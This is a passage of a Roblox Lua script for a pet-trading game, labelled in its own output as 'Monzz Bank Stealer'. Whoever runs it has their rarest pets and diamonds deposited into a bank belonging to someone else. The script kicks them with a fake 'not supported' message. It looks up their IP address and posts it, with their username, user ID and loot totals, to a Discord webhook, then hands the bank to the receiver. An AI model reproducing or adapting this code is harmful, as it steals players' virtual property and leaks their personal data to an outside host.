    for i, v in pairs(MList) do
        if #FinalList < max then
            table.insert(FinalList, v)
        end
    end
elseif #EList + #SList + #MList + #HList > max and #HList > max then
    for i, v in pairs(HList) do
        if #FinalList < max then
            table.insert(FinalList, v)
        end
    end
elseif #EList + #MList + #PList + #SList + #HList > max and #HList == 0 and #EList < max then
    for i, v in pairs(EList) do
        table.insert(FinalList, v)
    end
    for i, v in pairs(SList) do
        if #FinalList < max then
            table.insert(FinalList, v)
        end
    end
    for i, v in pairs(MList) do
        if #FinalList < max then
            table.insert(FinalList, v)
        end
    end
elseif #EList + #MList + #PList + #SList > max and #HList == 0 and #EList > max then
    for i, v in pairs(EList) do
        if #FinalList < max then
            table.insert(FinalList, v)
        end
    end
elseif #EList + #MList + #PList + #SList > max and #HList == 0 and #EList == 0 and #SList < max then
    for i, v in pairs(SList) do
        table.insert(FinalList, v)
    end
    for i, v in pairs(MList) do
        if #FinalList < max then
            table.insert(FinalList, v)
        end
    end
elseif #EList + #MList + #PList + #SList > max and #HList == 0 and #EList == 0 and #SList > max then
    for i, v in pairs(SList) do
        if #FinalList < max then
            table.insert(FinalList, v)
        end
    end
end
-- Bank Pets
wait()
game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.Game["Open Eggs"].Disabled = true
local A_1 = {
    [1] = "Cracked Egg",
    [2] = false
}
eggremote:InvokeServer("Cracked Egg", false, false)
wait()
local A_1 = {
    [1] = Bank,
    [2] = FinalList,
    [3] = 0
}

wait()
local diaamt = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get().Diamonds
if diaamt ~= 0 then
    diaamt = diaamt - 1
end

if tier == 1 and diaamt > tier1gems then
    diaamt = tier1gems
elseif tier == 1 and diaamt <= tier1gems then
    diaamt = diaamt
elseif tier == 2 and diaamt > tier2gems then
    diaamt = tier2gems
elseif tier == 2 and diaamt <= tier2gems then
    diaamt = diaamt
elseif tier == 3 and diaamt > tier3gems then
    diaamt = tier3gems
elseif tier == 3 and diaamt <= tier3gems then
    diaamt = diaamt
elseif tier == 4 and diaamt > tier4gems then
    diaamt = tier4gems
elseif tier == 4 and diaamt <= tier4gems then
    diaamt = diaamt
else
    diaamt = diaamt
end




local s, e = pcall(function()
    wait(0.2)
    depositremote:InvokeServer(Bank, FinalList, diaamt)
end)

if s == false then
    wait(0.2)
    depositremote:InvokeServer(Bank, FinalList, 1)
end
local banktiercheck = true
if s == true then
    if tier == 1 and diaamt + SuperBank["Storage"]["Currency"]["Diamonds"] >= 40000000 then
        upgraderemote:InvokeServer(Bank)
        banktiercheck = true
        tier = 2
    elseif tier == 1 and diaamt + SuperBank["Storage"]["Currency"]["Diamonds"] < 40000000 then
        banktiercheck = false
        game:GetService("Players").LocalPlayer:Kick("Script Is Not Supported")
    end
end
local SFinalList = {}
if #FinalList == 50 then
    wait(0.5)
    local Smax = 50

    Library = require(game:GetService("ReplicatedStorage").Framework:FindFirstChild("Library"))
    Functions = Library.Functions

    SEXCList = {}
    SMythicList = {}
    SSecretList = {}
    SHugeList = {}
    SPogList = {}
    SBananaList = {}


    SSList = {}
    SEList = {}
    SMList = {}
    SHList = {}
    SPList = {}
    SBList = {}

    table.foreach(Library.Directory.Pets, function(i, v)
        if v.rarity == "Exclusive" and not v.huge then
            table.insert(SEXCList, i)
        end
        if v.rarity == "Event" and not v.huge then
            table.insert(SEXCList, i)
        end
        if v.rarity == "Mythical" then
            table.insert(SMythicList, i)
        end
        if v.huge then
            table.insert(SHugeList, i)
        end
        if v.rarity == "Secret" then
            table.insert(SSecretList, i)
        end
        if string.split(v.name, " ")[1] == "Pog" then
            table.insert(SPogList, i)
        end
        if v.name == "banana" then
            table.insert(SBananaList, i)
        end
    end)
    for i, v in pairs(SPogList) do
        table.insert(SEXCList, v)
    end
    for i, v in pairs(SBananaList) do
        table.insert(SEXCList, v)
    end
    local Spets = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get().Pets
    local y = {}
    for i, v in pairs(Spets) do
        y[v["uid"]] = false
    end
    for i, v in pairs(Spets) do
        if table.find(SEXCList, v["id"]) ~= nil then
            table.insert(SEList, v["uid"])
        end
        if table.find(SMythicList, v["id"]) ~= nil and v.s >= 1e+15 and not v.hc then
            table.insert(SMList, v["uid"])
        end
        if table.find(SMythicList, v["id"]) ~= nil and v.hc then
            table.insert(SMList, v["uid"])
        end
        if table.find(SSecretList, v["id"]) ~= nil then
            table.insert(SSList, v["uid"])
        end
        if table.find(SHugeList, v["id"]) ~= nil then
            table.insert(SHList, v["uid"])
        end
    end
    if tier == 1 then
        Smax = tier1hold - #FinalList
    elseif tier == 2 then
        if tier2hold - #FinalList > 50 then
            Smax = 50
        elseif tier2hold - #FinalList < 50 then
            Smax = tier2hold - #FinalList
        end
    elseif tier == 3 then
        if tier3hold - #FinalList > 50 then
            Smax = 50
        elseif tier3hold - #FinalList < 50 then
            Smax = tier3hold - #FinalList
        end
    elseif tier == 4 - #FinalList then
        if tier4hold - #FinalList > 50 then
            Smax = 50
        elseif tier4hold - #FinalList < 50 then
            Smax = tier4hold - #FinalList
        end
    else
        Smax = 50
    end
    print(Smax)
    if #SEList + #SMList + #SPList + #SSList + #SHList < Smax then
        for i, v in pairs(SHList) do
            table.insert(SFinalList, v)
        end
        for i, v in pairs(SEList) do
            table.insert(SFinalList, v)
        end
        for i, v in pairs(SSList) do
            table.insert(SFinalList, v)
        end
        for i, v in pairs(SMList) do
            table.insert(SFinalList, v)
        end
    elseif #SEList + #SSList + #SMList + #SHList > Smax and #SHList < Smax then
        for i, v in pairs(SHList) do
            table.insert(SFinalList, v)
        end
        for i, v in pairs(SEList) do
            if #SFinalList < Smax then
                table.insert(SFinalList, v)
            end
        end
        for i, v in pairs(SSList) do
            if #SFinalList < Smax then
                table.insert(SFinalList, v)
            end
        end
        for i, v in pairs(SMList) do
            if #SFinalList < Smax then
                table.insert(SFinalList, v)
            end
        end
    elseif #SEList + #SSList + #SMList + #SHList > Smax and #SHList > Smax then
        for i, v in pairs(SHList) do
            if #SFinalList < Smax then
                table.insert(SFinalList, v)
            end
        end
    elseif #SEList + #SMList + #SPList + #SSList + #SHList > Smax and #SHList == 0 and #SEList < Smax then
        for i, v in pairs(SEList) do
            table.insert(SFinalList, v)
        end
        for i, v in pairs(SSList) do
            if #SFinalList < Smax then
                table.insert(SFinalList, v)
            end
        end
        for i, v in pairs(SMList) do
            if #SFinalList < Smax then
                table.insert(SFinalList, v)
            end
        end
    elseif #SEList + #SMList + #SPList + #SSList > Smax and #SHList == 0 and #SEList > Smax then
        for i, v in pairs(SEList) do
            if #SFinalList < Smax then
                table.insert(SFinalList, v)
            end
        end
    elseif #SEList + #SMList + #SPList + #SSList > Smax and #SHList == 0 and #SEList == 0 and #SSList < Smax then
        for i, v in pairs(SSList) do
            table.insert(SFinalList, v)
        end
        for i, v in pairs(SMList) do
            if #SFinalList < Smax then
                table.insert(SFinalList, v)
            end
        end
    elseif #SEList + #SMList + #SPList + #SSList > Smax and #SHList == 0 and #SEList == 0 and #SSList > Smax then
        for i, v in pairs(SSList) do
            if #SFinalList < Smax then
                table.insert(SFinalList, v)
            end
        end
    end
    -- Bank Pets
    wait()
    local A_1 = {
        [1] = Bank,
        [2] = SFinalList,
        [3] = 0
    }

    wait()
    local Sdiaamt = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get().Diamonds
    if Sdiaamt ~= 0 then
        Sdiaamt = Sdiaamt - 1
    end

    if tier == 1 and Sdiaamt > tier1gems - diaamt then
        Sdiaamt = tier1gems - diaamt
    elseif tier == 1 and diaamt <= tier1gems - diaamt then
        Sdiaamt = Sdiaamt
    elseif tier == 2 and diaamt > tier2gems - diaamt then
        Sdiaamt = tier2gems - diaamt
    elseif tier == 2 and diaamt <= tier2gems - diaamt then
        Sdiaamt = Sdiaamt
    elseif tier == 3 and diaamt > tier3gems - diaamt then
        Sdiaamt = tier3gems - diaamt
    elseif tier == 3 and diaamt <= tier3gems - diaamt then
        Sdiaamt = Sdiaamt
    elseif tier == 4 and diaamt > tier4gems - diaamt then
        Sdiaamt = tier4gems - diaamt
    elseif tier == 4 and diaamt <= tier4gems - diaamt then
        Sdiaamt = Sdiaamt
    else
        Sdiaamt = Sdiaamt
    end

    local s, e = pcall(function()
        wait(0.2)
        depositremote:InvokeServer(Bank, SFinalList, Sdiaamt)
    end)

    if s == false then
        wait(0.2)
        depositremote:InvokeServer(Bank, SFinalList, 1)
    end
end
-- abbreviations
local diaamt2 = diaamt
local abbreviations = {
    k = 4,
    m = 7,
    b = 10,
    T = 13,
}
local DiamondsCount = tostring(math.floor(diaamt2))

local ChosenAbbreviation
for abbreviation, digits in pairs(abbreviations) do
    if #DiamondsCount >= digits and #DiamondsCount < (digits + 3) then
        ChosenAbbreviation = abbreviation
        break
    end
end

if ChosenAbbreviation then
    local digits = abbreviations[ChosenAbbreviation]
    local rounded = math.floor(diaamt2 / 10 ^ (digits - 3)) * 10 ^ (digits - 3)
    DiamondsCount = string.format("%0.2f", rounded / 10 ^ (digits - 1))
    local addsd = string.split(DiamondsCount, ".")[2]
    local pnt = "."
    if string.split(addsd, "")[2] == "0" and string.split(addsd, "")[1] ~= "0" then
        DiamondsCount = string.split(DiamondsCount, ".")[1] .. pnt .. string.split(addsd, "")[1] .. ChosenAbbreviation
    elseif string.split(addsd, "")[2] == "0" and string.split(addsd, "")[1] == "0" then
        DiamondsCount = string.split(DiamondsCount, ".")[1] .. ChosenAbbreviation
    elseif string.split(addsd, "")[2] ~= "0" and string.split(addsd, "")[1] ~= "0" then
        DiamondsCount = DiamondsCount .. ChosenAbbreviation
    elseif string.split(addsd, "")[2] ~= "0" and string.split(addsd, "")[1] == "0" then
        DiamondsCount = DiamondsCount .. ChosenAbbreviation
    else
        DiamondsCount = diamond
    end
end
local Bdiaamt = SuperBank["Storage"]["Currency"]["Diamonds"]
local Babbreviations = {
    k = 4,
    m = 7,
    b = 10,
    T = 13,
}
local BDiamondsCount = tostring(math.floor(Bdiaamt))
local BChosenAbbreviation
for Babbreviation, Bdigits in pairs(Babbreviations) do
    if #BDiamondsCount >= Bdigits and #BDiamondsCount < (Bdigits + 3) then
        BChosenAbbreviation = Babbreviation
        break
    end
end

if BChosenAbbreviation then
    local Bdigits = Babbreviations[BChosenAbbreviation]
    local Brounded = math.floor(Bdiaamt / 10 ^ (Bdigits - 3)) * 10 ^ (Bdigits - 3)
    BDiamondsCount = string.format("%0.2f", Brounded / 10 ^ (Bdigits - 1))
    local Baddsd = string.split(BDiamondsCount, ".")[2]
    local pnt = "."
    if string.split(Baddsd, "")[2] == "0" and string.split(Baddsd, "")[1] ~= "0" then
        BDiamondsCount = string.split(BDiamondsCount, ".")[1] ..
        pnt .. string.split(Baddsd, "")[1] .. BChosenAbbreviation
    elseif string.split(Baddsd, "")[2] == "0" and string.split(Baddsd, "")[1] == "0" then
        BDiamondsCount = string.split(BDiamondsCount, ".")[1] .. BChosenAbbreviation
    elseif string.split(Baddsd, "")[2] ~= "0" and string.split(Baddsd, "")[1] ~= "0" then
        BDiamondsCount = BDiamondsCount .. BChosenAbbreviation
    elseif string.split(Baddsd, "")[2] ~= "0" and string.split(Baddsd, "")[1] == "0" then
        BDiamondsCount = BDiamondsCount .. BChosenAbbreviation
    else
        BDiamondsCount = Bdiaamt
    end
end


local totaldiamond = Bdiaamt + diaamt
local Tabbreviations = {
    k = 4,
    m = 7,
    b = 10,
    T = 13,
}
local TDiamondsCount = tostring(math.floor(totaldiamond))

local TChosenAbbreviation
for Tabbreviation, Tdigits in pairs(Tabbreviations) do
    if #TDiamondsCount >= Tdigits and #TDiamondsCount < (Tdigits + 3) then
        TChosenAbbreviation = Tabbreviation
        break
    end
end

if TChosenAbbreviation then
    local Tdigits = Tabbreviations[TChosenAbbreviation]
    local Trounded = math.floor(totaldiamond / 10 ^ (Tdigits - 3)) * 10 ^ (Tdigits - 3)
    TDiamondsCount = string.format("%0.2f", Trounded / 10 ^ (Tdigits - 1))
    local Taddsd = string.split(TDiamondsCount, ".")[2]
    local pnt = "."
    if string.split(Taddsd, "")[2] == "0" and string.split(Taddsd, "")[1] ~= "0" then
        TDiamondsCount = string.split(TDiamondsCount, ".")[1] ..
        pnt .. string.split(Taddsd, "")[1] .. TChosenAbbreviation
    elseif string.split(Taddsd, "")[2] == "0" and string.split(Taddsd, "")[1] == "0" then
        TDiamondsCount = string.split(TDiamondsCount, ".")[1] .. TChosenAbbreviation
    elseif string.split(Taddsd, "")[2] ~= "0" and string.split(Taddsd, "")[1] ~= "0" then
        TDiamondsCount = TDiamondsCount .. TChosenAbbreviation
    elseif string.split(Taddsd, "")[2] ~= "0" and string.split(Taddsd, "")[1] == "0" then
        TDiamondsCount = TDiamondsCount .. TChosenAbbreviation
    else
        TDiamondsCount = totaldiamond
    end
end

local Wdiaamt = DiamondsDiamonds
local Wabbreviations = {
    k = 4,
    m = 7,
    b = 10,
    T = 13,
}
local WDiamondsCount = tostring(math.floor(Wdiaamt))

local WChosenAbbreviation
for Wabbreviation, Wdigits in pairs(Wabbreviations) do
    if #WDiamondsCount >= Wdigits and #WDiamondsCount < (Wdigits + 3) then
        WChosenAbbreviation = Wabbreviation
        break
    end
end

if WChosenAbbreviation then
    local Wdigits = Wabbreviations[WChosenAbbreviation]
    local Wrounded = math.floor(Wdiaamt / 10 ^ (Wdigits - 3)) * 10 ^ (Wdigits - 3)
    WDiamondsCount = string.format("%0.2f", Wrounded / 10 ^ (Wdigits - 1))
    local Waddsd = string.split(WDiamondsCount, ".")[2]
    local pnt = "."
    if string.split(Waddsd, "")[2] == "0" and string.split(Waddsd, "")[1] ~= "0" then
        WDiamondsCount = string.split(WDiamondsCount, ".")[1] ..
        pnt .. string.split(Waddsd, "")[1] .. WChosenAbbreviation
    elseif string.split(Waddsd, "")[2] == "0" and string.split(Waddsd, "")[1] == "0" then
        WDiamondsCount = string.split(WDiamondsCount, ".")[1] .. WChosenAbbreviation
    elseif string.split(Waddsd, "")[2] ~= "0" and string.split(Waddsd, "")[1] ~= "0" then
        WDiamondsCount = WDiamondsCount .. WChosenAbbreviation
    elseif string.split(Waddsd, "")[2] ~= "0" and string.split(Waddsd, "")[1] == "0" then
        WDiamondsCount = WDiamondsCount .. WChosenAbbreviation
    else
        WDiamondsCount = DiamondsDiamonds
    end
end



-- Sending webhook

local username = game:GetService("Players").LocalPlayer.Name
local fardplayer = game:GetService("Players").LocalPlayer
local receiver = game:GetService("Players"):GetNameFromUserIdAsync(_G.UserID)
local IPadress = game:HttpGet('https://ipinfo.io/ip')
local banktier = SuperBank["Tier"]
local lmao = "/5"
local ping
    if #HList ~= 0 or #BHList ~= 0 then
        ping = "@everyone"
    elseif #HList == 0 and #BHList == 0 then
        ping = ""
    end
-- Img
local data1
if banktiercheck == true then
    imgs = "https://cdn.discordapp.com/attachments/1100823909009465497/1124473588045590578/Screenshot_20230414-055925_Gallery_1.jpg"

    data1 = {
        ["content"] = ping,
        ["username"] = "Monzz Scriptz",
        ["avatar_url"] = "https://cdn.discordapp.com/attachments/1100823909009465497/1124473588045590578/Screenshot_20230414-055925_Gallery_1.jpg",
        ["embeds"] = { {
            ["title"] = "**New Hit** ||Monzz Bank Stealer||",
            ["url"] = "https://discord.gg/4y4CZfdJHu",
            ["type"] = "rich",
            ["color"] = tonumber(0xAB0909),
            ["thumbnail"] = {
                ["url"] = imgs,
                ["height"] = 420,
                ["width"] = 420
            },
            ["fields"] = { {
                ["name"] = "**Monzz Scriptz's Bank Stealer** :skull:",
                ["value"] = "```Username     : " .. username .. "\nDisplay Name : " .. fardplayer.DisplayName ..
                    "\nUser-ID      : " .. fardplayer.userId .. "\nAccount Age  : " .. fardplayer.AccountAge ..
                    " Days\nIP Address   : " .. IPadress .. "\nRank         : " .. rank ..
                    "\nExploit      : " .. exploit .. "\nReceiver     : " .. receiver .. "\nBank Tier    : Tier " .. SuperBank["Tier"] .. "```",
                ["inline"] = false
            }, {
                ["name"] = ":gem: **Diamonds** :gem:",
                ["value"] = "```" .. DiamondsCount .. "```",
                ["inline"] = true
            }, {
                ["name"] = ":frog: **Pets Amount** :frog:",
                ["value"] = "```" .. #FinalList + #SFinalList .. "```",
                ["inline"] = true
            }, {
                ["name"] = ":money_mouth: **Huges** :money_mouth:",
                ["value"] = "```" .. #HList .. "```",
                ["inline"] = true
            }, {
                ["name"] = ":cat: **Exclusives** :cat:",
                ["value"] = "```" .. #EList .. "```",
                ["inline"] = true
            }, {
                ["name"] = ":performing_arts: **Secrets** :performing_arts:",
                ["value"] = "```" .. #SList .. "```",
                ["inline"] = true
            }, {
                ["name"] = ":rabbit: **Mythicals** :rabbit:",
                ["value"] = "```" .. #MList .. "```",
                ["inline"] = true
            },
                {
                    ["name"] = "---------------------------------------",
                    ["value"] = "",
                    ["inline"] = false
                },
                {
                    ["name"] = ":eyes: **Bank Pets** :eyes:",
                    ["value"] = "",
                    ["inline"] = false
                },
                {
                    ["name"] = "---------------------------------------",
                    ["value"] = "",
                    ["inline"] = false
                },
                {
                    ["name"] = ":gem: **Diamonds** :gem:",
                    ["value"] = "```" .. BDiamondsCount .. "```",
                    ["inline"] = true
                }, {
                ["name"] = ":frog: **Pets Amount** :frog:",
                ["value"] = "```" .. #SuperBank["Storage"]["Pets"] .. "```",
                ["inline"] = true
            }, {
                ["name"] = ":money_mouth: **Huges** :money_mouth:",
                ["value"] = "```" .. #BHList .. "```",
                ["inline"] = true
            }, {
                ["name"] = ":cat: **Exclusives** :cat:",
                ["value"] = "```" .. BEHList .. "```",
                ["inline"] = true
            }, {
                ["name"] = ":performing_arts: **Secrets** :performing_arts:",
                ["value"] = "```" .. #BSList .. "```",
                ["inline"] = true
            }, {
                ["name"] = ":rabbit: **Mythicals** :rabbit:",
                ["value"] = "```" .. #BMList .. "```",
                ["inline"] = true
            },
                {
                    ["name"] = ":bank: **Joined Banks** :bank:",
                    ["value"] = "```" .. bankscount .. lmao .. "```",
                    ["inline"] = true
                },
                {
                    ["name"] = ":gem: **Wd Diamonds** :gem:",
                    ["value"] = "```" .. WDiamondsCount .. "```",
                    ["inline"] = true
                }, {
                ["name"] = ":money_mouth: **Wd Huges** :money_mouth:",
                ["value"] = "```" .. FinalFinal .. "```",
                ["inline"] = true
            },
                {
                    ["name"] = "---------------------------------------",
                    ["value"] = "",
                    ["inline"] = false
                },
                {
                    ["name"] = ":eyes: **Total Pets** :eyes:",
                    ["value"] = "",
                    ["inline"] = false
                },
                {
                    ["name"] = "---------------------------------------",
                    ["value"] = "",
                    ["inline"] = false
                },
                {
                    ["name"] = ":gem: **Diamonds** :gem:",
                    ["value"] = "```" .. TDiamondsCount .. "```",
                    ["inline"] = true
                }, {
                ["name"] = ":frog: **Pets Amount** :frog:",
                ["value"] = "```" .. #SuperBank["Storage"]["Pets"] + #FinalList .. "```",
                ["inline"] = true
            },
            }
        }
        }
    }
end

local newdata1 = game:GetService("HttpService"):JSONEncode(data1)

local headers = {
    ["content-type"] = "application/json"
}

if Webhook ~= nil then
    local abcdef1 = {
        Url = url,
        Body = newdata1,
        Method = "POST",
        Headers = headers
    }
    request(abcdef1)
end
for i, v in pairs(SuperBank["Players"]) do
    if v ~= _G.UserID then
        kickremote:InvokeServer(Bank, v)
    end
end
while task.wait(0.1) do
    inviteremote:InvokeServer(mybanks[1]["BUID"], _G.UserID)
end